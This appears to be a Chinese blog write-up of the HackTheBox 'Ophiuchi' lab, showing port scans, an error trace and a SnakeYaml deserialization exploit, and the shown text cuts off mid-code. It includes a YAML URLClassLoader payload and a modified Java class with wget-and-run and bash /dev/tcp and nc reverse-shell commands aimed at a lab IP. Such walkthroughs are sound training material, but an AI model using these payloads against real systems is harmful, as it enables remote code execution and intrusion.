@@ -1,0 +1,780 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：YAML 反序列化、SnakeYaml 反序列化漏洞 、tomcat-users.xml 密码泄露、sudo提权、环境变量提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ophiuchi-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/01/15/Ophiuchi-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：YAML 反序列化、SnakeYaml 反序列化漏洞 、tomcat-users.xml 密码泄露、sudo提权、环境变量提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Ophiuchi-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Ophiuchi-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Ophiuchi-htb-writeup/3.png">
+<meta property="article:published_time" content="2024-01-15T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-02-04T08:28:02.096Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Ophiuchi-htb-writeup/1.png">
+  
+  
+  
+  <title>Ophiuchi-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ophiuchi-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-15 23:50" pubdate>
+          2024年1月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          150 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Ophiuchi-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：YAML 反序列化、SnakeYaml 反序列化漏洞 、tomcat-users.xml 密码泄露、sudo提权、环境变量提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://www.jgeek.cn/article/97.html</code></p>
+<p>参考链接：<code>https://marmeus.com/post/Ophiuchi</code></p>
+<p>参考链接：<code>https://www.r3pek.org/posts/htb-ophiuchi-box/</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.227</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/tools/portscan]<br>└─$ sudo ./htb-portscan.sh 10.10.10.227 tcp<br>[sudo] kali 的密码：<br>开始对 10.10.10.227 进行nmap端口扫描...<br>* 正在执行tcp协议的端口扫描探测...<br>sudo nmap -min-rate 10000 -p- <span class="hljs-string">&quot;10.10.10.227&quot;</span> -oG <span class="hljs-string">&quot;10.10.10.227&quot;</span>-tcp-braker-allports<br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 16:00 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.227<br>Host is up (0.31s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>8080/tcp open  http-proxy<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.22 seconds<br>* 正在对开放的端口进行TCP全连接式版本探测和系统版本以及漏洞探测...<br>sudo nmap -sT -sV -sC -p<span class="hljs-string">&quot;22,8080,&quot;</span> <span class="hljs-string">&quot;10.10.10.227&quot;</span><br><br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 16:00 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.227<br>Host is up (0.31s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6d:<span class="hljs-built_in">fc</span>:68:e2:da:5e:80:<span class="hljs-built_in">df</span>:bc:d0:45:f5:29:db:04:ee (RSA)<br>|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)<br>|_  256 17:6b:c3:a8:<span class="hljs-built_in">fc</span>:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)<br>8080/tcp open  http    Apache Tomcat 9.0.38<br>|_http-title: Parse YAML<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 22.96 seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、查看下8080端口服务情况</p>
+<p><code>http://10.10.10.227:8080/</code></p>
+<p><img src="http://sh1yan.top/photo/Ophiuchi-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>4、通过扫描目录等情况，感觉入口点应该都不是，那估计还是首页的这个功能</p>
+<p>5、YAML 反序列化，开始怀疑这个题目是考这个，根据网站使用的Java框架，估计是 java yaml的反序列化，经过尝试一些网上公开的yaml反序列化的poc和常规的yaml文本，都是提示安全策略</p>
+<p><img src="http://sh1yan.top/photo/Ophiuchi-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、但是使用 单引号进行输入，发现了报错信息</p>
+<p><img src="http://sh1yan.top/photo/Ophiuchi-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> scanning a quoted scalar<br> in <span class="hljs-string">&#x27;string&#x27;</span>, line <span class="hljs-number">1</span>, column <span class="hljs-number">1</span>:<br>    <span class="hljs-string">&#x27;</span><br><span class="hljs-string">    ^</span><br><span class="hljs-string">found unexpected end of stream</span><br><span class="hljs-string"> in &#x27;</span>string<span class="hljs-string">&#x27;, line 1, column 2:</span><br><span class="hljs-string">    &#x27;</span><br>     ^<br><br>	org.yaml.snakeyaml.scanner.ScannerImpl.scanFlowScalarSpaces(ScannerImpl.java:<span class="hljs-number">1916</span>)<br>	org.yaml.snakeyaml.scanner.ScannerImpl.scanFlowScalar(ScannerImpl.java:<span class="hljs-number">1831</span>)<br>	org.yaml.snakeyaml.scanner.ScannerImpl.fetchFlowScalar(ScannerImpl.java:<span class="hljs-number">1027</span>)<br>	org.yaml.snakeyaml.scanner.ScannerImpl.fetchSingle(ScannerImpl.java:<span class="hljs-number">1002</span>)<br>	org.yaml.snakeyaml.scanner.ScannerImpl.fetchMoreTokens(ScannerImpl.java:<span class="hljs-number">390</span>)<br>	org.yaml.snakeyaml.scanner.ScannerImpl.checkToken(ScannerImpl.java:<span class="hljs-number">227</span>)<br>	org.yaml.snakeyaml.parser.ParserImpl$ParseImplicitDocumentStart.produce(ParserImpl.java:<span class="hljs-number">195</span>)<br>	org.yaml.snakeyaml.parser.ParserImpl.peekEvent(ParserImpl.java:<span class="hljs-number">158</span>)<br>	org.yaml.snakeyaml.parser.ParserImpl.checkEvent(ParserImpl.java:<span class="hljs-number">148</span>)<br>	org.yaml.snakeyaml.composer.Composer.getSingleNode(Composer.java:<span class="hljs-number">118</span>)<br>	org.yaml.snakeyaml.constructor.BaseConstructor.getSingleData(BaseConstructor.java:<span class="hljs-number">150</span>)<br>	org.yaml.snakeyaml.Yaml.loadFromReader(Yaml.java:<span class="hljs-number">490</span>)<br>	org.yaml.snakeyaml.Yaml.load(Yaml.java:<span class="hljs-number">416</span>)<br>	Servlet.doPost(Servlet.java:<span class="hljs-number">15</span>)<br>	javax.servlet.http.HttpServlet.service(HttpServlet.java:<span class="hljs-number">652</span>)<br>	javax.servlet.http.HttpServlet.service(HttpServlet.java:<span class="hljs-number">733</span>)<br>	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:<span class="hljs-number">53</span>)<br></code></pre></td></tr></table></figure>
+
+<p>7、由于卡了很久，就直接参考演练报告了</p>
+<p><code>SnakeYaml 反序列化漏洞 - https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/</code></p>
+<p><code>漏洞的产生原因是由于解析了不受信任的 YAML 数据（!!做为特殊功能出现，该语法允许在解析 YAML 数据时调用任何 Java 类的构造函数，即 (!!&lt;java 类构造函数&gt;)），从而引起的任意代码执行。</code></p>
+<p>8、这里提交poc进行验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">!!javax.script.ScriptEngineManager [<br>  !!java.net.URLClassLoader [[<br>    !!java.net.URL [<span class="hljs-string">&quot;http://10.10.14.8/&quot;</span>]<br>  ]]<br>]<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 80 <br>listening on [any] 80 ...<br>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.227] 41856<br>HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1<br>User-Agent: Java/11.0.8<br>Host: 10.10.14.8<br>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br>Connection: keep-alive<br></code></pre></td></tr></table></figure>
+
+<p>9、发现获取到一些信息的验证请求，验证后漏洞是存在的，目标服务器请求了我本地起的 Web 服务。并且我注意到它会自动加载 &#x2F;META-INF&#x2F;services&#x2F;javax.script.ScriptEngineFactory 进行序列化。</p>
+<p>10、顺着这个思路找个漏洞利用文章，构造对目标服务器的 RCE 链：<code>https://pulsesecurity.co.nz/advisories/Insecure-YAML-Deserialisation</code></p>
+<p>11、以下的操作步骤是一个固定的操作步骤，没法去省略的（2个方法都是对的，但是不知道为啥，是环境的问题，还是版本的问题，还没有弄清楚）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/artsploit/yaml-payload<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ git <span class="hljs-built_in">clone</span> https://github.com/artsploit/yaml-payload.git  <br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">cd</span> yaml-payload-master <br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ <span class="hljs-built_in">ls</span><br>README.md  src<br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ <span class="hljs-built_in">cd</span> src                <br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master/src]<br>└─$ <span class="hljs-built_in">ls</span><br>artsploit  META-INF<br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master/src]<br>└─$ <span class="hljs-built_in">cd</span> artsploit <br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master/src/artsploit]<br>└─$ <span class="hljs-built_in">ls</span><br>AwesomeScriptEngineFactory.java<br><br><br>随后修改 AwesomeScriptEngineFactory.java 文件内容：<br><br>    public <span class="hljs-function"><span class="hljs-title">AwesomeScriptEngineFactory</span></span>() &#123;<br>        try &#123;<br>            Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;dig scriptengine.x.artsploit.com&quot;</span>);<br>            Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>需要修改上面两行.<span class="hljs-built_in">exec</span>()里的内容，这里演练报告分别提供了2个方式进行处置<br><br><br>方法1：<br><br>创建1个shell.sh文件，并写入以下内容<br><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">touch</span> /tmp/f; <span class="hljs-built_in">rm</span> /tmp/f; <span class="hljs-built_in">mkfifo</span> /tmp/f; <span class="hljs-built_in">cat</span> /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.8 443 &gt; /tmp/f<br><br>修改里面内容为这个<br><br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;wget 10.10.14.8:80/shell.sh -O /tmp/shell.sh&quot;</span>);<br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;bash /tmp/shell.sh&quot;</span>);<br><br><br>方法2：<br><br><br>直接修改内容为以下内容<br><br>增加2个三方库，再把漏洞利用过程的代码修改下<br><br>import java.util.Base64;<br>import java.util.concurrent.TimeUnit;<br><br><br>String cmd = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1&quot;</span>; // &lt;-- your actual <span class="hljs-built_in">command</span> here<br>String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());<br>cmd = <span class="hljs-string">&quot;bash -c &#123;echo,&quot;</span>+b64Cmd+<span class="hljs-string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>; // *nix only<br>Runtime.getRuntime().<span class="hljs-built_in">exec</span>(cmd).waitFor(30, TimeUnit.SECONDS); //increase this probably<br><br><br>一会两个都尝试下看看<br><br><br>修改完成后，需要进行编译，这里先使用方法2的<br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master/src/artsploit]<br>└─$ vim AwesomeScriptEngineFactory.java <br><br><br>javac src/artsploit/AwesomeScriptEngineFactory.java<br>jar -cvf yaml-payload.jar -C src/ .<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master/src/artsploit]<br>└─$ <span class="hljs-built_in">cd</span> ../../   <br>                                                                                                       <br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ <span class="hljs-built_in">pwd</span><br>/home/kali/桌面/yaml-payload-master<br><br><br>┌──(kali㉿kali)-[~/桌面/yaml-payload-master]<br>└─$ javac src/artsploit/AwesomeScriptEngineFactory.java<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="hljs-literal">true</span><br>src/artsploit/AwesomeScriptEngineFactory.java:21: 错误: 未报告的异常错误InterruptedException; 必须对其进行捕获或声明以便抛出<br>                        .waitFor(30, TimeUnit.SECONDS); //increase this probably<br>                                ^<br>1 个错误<br><br><br>经过人工智能回答，还是得补充下吧，以下是完整的修改内容<br><br><br><br>import javax.script.ScriptEngine;<br>import javax.script.ScriptEngineFactory;<br>import java.io.IOException;<br>import java.util.List;<br>import java.util.Base64;<br>import java.util.concurrent.TimeUnit;<br><br>public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;<br><br>    public AwesomeScriptEngineFactory() throws InterruptedException &#123;<br>        try &#123;<br>            // Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;dig scriptengine.x.artsploit.com&quot;</span>);<br>            // Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.8/443 0&gt;&amp;1&quot;</span>; // &lt;-- your actual <span 